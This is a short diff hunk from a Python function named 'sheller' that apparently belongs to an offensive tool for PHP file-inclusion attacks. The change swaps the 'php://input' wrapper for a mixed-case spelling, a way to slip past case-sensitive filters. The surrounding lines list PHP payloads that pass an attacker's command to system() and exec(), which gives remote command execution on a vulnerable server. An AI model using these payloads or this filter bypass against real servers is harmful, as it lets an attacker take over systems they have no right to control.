@@ -1209,7 +1209,7 @@ def sheller(
                     if app:
                         app.processEvents()
 
-            wrapper = "php://input"
+            wrapper = "pHP://iNPuT"
             payloads = [
                 '<?php system("{}"); ?>'.format(PAYLOAD),
                 '<?php exec("{}"); ?>'.format(PAYLOAD),
